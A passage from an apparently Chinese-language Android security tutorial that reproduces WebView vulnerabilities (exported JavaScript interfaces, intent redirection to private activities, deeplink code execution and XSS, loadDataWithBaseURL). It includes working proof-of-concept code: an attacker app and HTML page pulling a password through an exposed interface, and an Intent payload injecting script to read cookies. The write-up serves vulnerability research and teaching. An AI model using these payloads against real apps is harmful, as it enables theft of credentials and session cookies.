
```java
public class JsIntentActivity extends AppCompatActivity {
@Override
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity\_js\_intent);
WebView webView = findViewById(R.id.Wind\_webviewIntent);
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new AndroidtoJs(), "test");
webView.loadData("", "text/html", null);
Uri getUri = getIntent().getData();
webView.loadUrl(String.valueOf(getUri));
}
/\*\*
\* 提供接口在Webview中供JS调用
\*/
public class AndroidtoJs {
// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解
@JavascriptInterface
public String getPassword() {
return "WindXaa12345678";
}
}
}
```

这里我们可以看出我们获取了密码`WindXaa12345678`，一般应用程序会对这里进行加密或者混淆，我们这里简单演示就不进行加密了。

我们将该组件设置为导出组件。

![image-20220729171422196](upload/attach/202207/905443\_8793MBMDUVDZESQ.png)

我们对实例样本分析，这里就可以利用接口导出的漏洞进行攻击。

**漏洞复现：**

我们再编写攻击样本：

```java
public class MainActivity extends AppCompatActivity {
@Override
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity\_main);
Button button = findViewById(R.id.button);
button.setOnClickListener(new View.OnClickListener() {
@Override
public void onClick(View v) {
Intent attackIntent = new Intent();
attackIntent.setClassName("com.iwindxaa.webview","com.iwindxaa.webview.JsIntentActivity");
attackIntent.setData(Uri.parse("http://ip地址端口号/attack.html"));
startActivity(attackIntent);
}
});
}
}
```

然后我们在本地编写恶意的html，利用前面讲述的远程加载。

```java
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>WebView Atack</title>
<script>
function callAndroid(){
//由于对象映射，所以调用test对象等于调用Android映射的对象
var password = test.getPassword();
document.getElementById("getdata").innerHTML= password;
}
</script>
</head>
<body>
<p id="getdata">攻击获得的数据将显示在此……</p>
<!--点击按钮则调用callAndroid函数-->
<button type="button" id="button1" onclick="callAndroid()">CIntent Attack!</button>
</body>
</html>
```

然后启动`http_server`。

![image-20220729172309137](upload/attach/202207/905443\_25GBQWTFBW4APF8.png)

此时我们启动攻击样本，并点击按钮。

![image-20220729172422110](upload/attach/202207/905443\_EVT84NFAXMY589U.png)

这里我们可以成功的加载我们的页面说明恶意html注入成功。

![image-20220729172443186](upload/attach/202207/905443\_HS43HEFRG9XZU4K.png)

然后我们再次点击js中的按钮，就可以获取敏感数据。

![image-20220729172552889](upload/attach/202207/905443\_MVC4SUBBHJSTKTW.png)

这里就获取的敏感的数据。

#### （2）Intent重定向导致launchAnyWhere漏洞

**漏洞原理：**

我们都知道Android中的组件需要导出才能够访问，而导出的组件往往存在一定的安全问题。

导出的组件一般有以下三种形式：

```java
1.在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为true;
2.如果组件没有显式设置android:exported为false，但是其intent-filter以及action存在，则也为导出组件
3.API Level在17以下的所有App的provider组件的android:exported属性默认值为true，17及以上默认值为false。
```

未导出的组件：

```java
组件显式设置android:exported="false"
组件没有intent-filter, 且没有显式设置android:exported的属性值，默认为非导出的;
组件虽然配置了intent-filter,，但是显式设置android:exported="false"
```

而通过一定的方法可以访问未导出的组件，我们将这种漏洞成为`launchAnyWhere`漏洞。

`Intent`可以通过重定向的原理，通过携带数据信息，访问一个可导出的组件，然后再进行数据传递去触发不可导出的组件，最后实现访问私有组件的目的，引起`launchAnyWhere`漏洞。

**漏洞复现：**

我们查看一个样本案例：

首先是不可导出组件`PrivateActivity`：

![image-20220730124850689](upload/attach/202207/905443\_DFCPGD63DGYF3HU.png)

然后可导出的组件：`WebView2Activity`

代码层的校验代码：

`WebView2Activity`

![image-20220730125041041](upload/attach/202207/905443\_UTXVH9Q5AYRTWVH.png)

`PrivateActivity`

![image-20220730125108657](upload/attach/202207/905443\_MMQXRU274JXCJRT.png)

然后我们编写攻击代码：

![image-20220730125254413](upload/attach/202207/905443\_W4Q2EBR4BJMXG2R.png)

效果如下：

![image-20220730125323004](upload/attach/202207/905443\_VY6W94GRBHQZ432.png)

可以看出我们通过`WebView` + `Intent`重定向就可以访问私有组件，从而实现`launchAnyWhere`漏洞。

![image-20220730125359818](upload/attach/202207/905443\_F8X3FEQCGE3A5E5.png)

### 5.Deeplink+WebView漏洞

`deeplink`是一种在网页中启动App的超链接。当用户点击`deeplink`链接时，Android系统会启动注册该`deeplink`的应用，打开在`Manifest`文件中注册该`deeplink`的`activity`。

`deeplink`在APP中会导致多类漏洞：通过`deeplink`操纵`WebView`造成的远程代码执行、敏感信息泄露、应用克隆、`launchAnyWhere`等漏洞。

#### （1）任意代码执行漏洞

**漏洞原理：**

样本代码层通过反射调用去安装的列表中搜索安装的应用，然后去调用其方法进行实现，我们可以构造相同的包名，然后将攻击样本去安装到手机上，是的应用触发任意代码执行漏洞。

**漏洞复现：**

样本代码段：

![image-20220730125800892](upload/attach/202207/905443\_ZTVPKHEC4XQMYCD.png)

我们构造Poc：

![image-20220730125820419](upload/attach/202207/905443\_J9EY8R3E44SH4U5.png)

注意这里我们要保证构造的攻击应用的包名和代码中校验的一致才能触发，然后我们启动，可以发现成功的触发了。

![image-20220730125901727](upload/attach/202207/905443\_PRJGQMKN3H35994.png)

**漏洞防护：**

需要对具体的包名进行校验，并对`DeepLink`进行过滤。

#### （2）XSS注入漏洞

**漏洞原理：**

这也是我们结合`Deeplink` + `WebView`导致的一个漏洞问题，我们可以通过构造含深度调用链的JS，然后通过加载去实现XSS注入。

**漏洞复现：**

首先我们查看样本的`DeepLinks`。

![image-20220730130234190](upload/attach/202207/905443\_NAWTWSGDKWK8C82.png)

然后我们可以发现样本的代码：

![image-20220730130256549](upload/attach/202207/905443\_8KJCX2AWWZRCTQQ.png)

我们构造攻击脚本：

![image-20220730130336427](upload/attach/202207/905443\_QA4SKBFC23HK4T8.png)

然后我们通过去访问该html：

![image-20220730130416578](upload/attach/202207/905443\_7XWKDCAB62358C7.png)

接着我们使用目标样本打开：

![image-20220730130442740](upload/attach/202207/905443\_WZVGRQ9J7AZPFDA.png)

即可以成功的进行XSS注入。

![image-20220730130506890](upload/attach/202207/905443\_ARQAAUCNDV3N5BR.png)

#### （3）DeepLinks在WebView上的组合漏洞

我们前面分析了很多`DeepLinks`在`WebView`上的漏洞，我们还可以将这些漏洞组合使用，我在测试一款银行的样本中发现组合漏洞：

![image-20220730130714437](upload/attach/202207/905443\_V55CMQ4ACJKK8WX.png)

这个结合了前面我们讲的网络漏洞、路径穿越、XSS、`WebView`漏洞，具体的大家可以去听我在平安SRC&&看雪的沙龙会议中的演讲。

以及我在网上收集的一个大佬的文章，描述的漏洞利用流程，大家可以参考：

![image-20220730141930818](upload/attach/202207/905443\_AZ5GPXZMTQ4MCFA.png)

参考文章：<a href="elink@615K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2F1M7$3k6G2j5%4g2K6i4K6u0W2L8X3g2@1i4K6u0r3j5i4m8H3i4K6u0V1N6Y4g2D9L8X3g2J5j5h3u0A6L8r3W2@1P5g2)9J5k6r3g2^5M7r3I4G2K9i4c8S2N6r3W2G2L8W2)9J5k6r3y4G2L8h3u0A6L8X3q4@1K9h3!0F1i4K6u0V1j5X3!0^5K9h3&6Y4i4K6u0r3">APP漏洞利用组合拳——应用克隆案例分析</a>

#### （4）loadDataWithBaseURL漏洞

当`loadDataWithBaseURL`的域名和内容同时可控是，可以构造任意域下的XSS。

```java
void loadDataWithBaseURL
(String baseUrl,
String data,
String mimeType,
String encoding,
String historyUrl)
```

除了明显的情况外，攻击者控制调用中的`baseUri`和参数`data`。

```java
webView.loadDataWithBaseURL("https://google.com/",
"<script>document.write(document.domain)</script>",
null, null, null);
```

**漏洞原理：**

`deeplink`加载任意`fragment`，转化为`WebView` `loadDataWithBaseURL`漏洞。

**漏洞复现：**

实现步骤：

(1) `victim-app://c/contact/2?fragmen_class=<fragment>`可启动任意`fragment`，并可 通过`Intent` `Extra`传参  
(2) 寻找到⼀个带`WebView`的`Fragment`：`GoogleMapWebViewFragment`  
(3) 可污染`loadDataWithBaseURL`的前两个参数，构造`victim.com`域下的XSS

```java
webview.loadDataWithBaseURL("victim.com","google-map.html", "text/html", ...);
```

攻击代码：

```java
Intent payload = new Intent(Intent.ACTION\_VIEW);
payload.setData(Uri.parse("victim-app://c/contact/2?fragmen\_class=com.victim.app.GoogleWebViewMapFragment"));
Bundle extra = new Bundle();
extra.putString("map\_url", "\"></script><script>alert(document.cookie);</script><script>");
extra.putString("map\_file\_name", "google\_map.html");
extra.putString("map\_domain", "https://www.victim-app.com");
payload.putExtra("bundle", extra);
startActivity(payload);
```

可以通过这个`deeplink`打开任意`fragment`的漏洞，实现可控任意域执行任意JS，实现盗取登陆态的用户`cookie`！

具体参考：<a href="elink@467K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7q4)9J5k6i4N6W2K9i4S2A6L8W2)9J5k6i4q4I4i4K6u0W2j5$3!0E0i4K6u0r3M7#2)9J5c8U0R3I4e0s2q4Q4x3X3c8v1N6@1q4e0L8X3E0e0f1K6u0%4k6K6j5J5d9q4y4$3b7g2)9K6c8R3`.`.">Android中的特殊攻击面（二）——危险的deeplink</a>

## 五、实验总结

本文我编写了很久，主要是一些案例和网上的漏洞复现需要大量的时间去做，很多案例和攻击poc，我都进行了手动编写，一些网上已有的大佬的文章样例，我也进行了一一的复现，将一些不能复现的全部剔除，WebView漏洞是Android APP上当前十分重要的漏洞，漏洞的种类十分多，本文归纳了20多种类别的漏洞并进行了一一的复现，具体漏洞扩展，大家可以参考后面的文献，而实验的poc和攻击样本我也会上传知识星球和github。

github网址：<a href="elink@467K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6i4K9h3&6V1h3r3q4S2">WindXaa</a>

## 六、参考文献

会议：

```
2020 看雪SDC Android WebView安全攻防指南2020
```

WebView的原理：
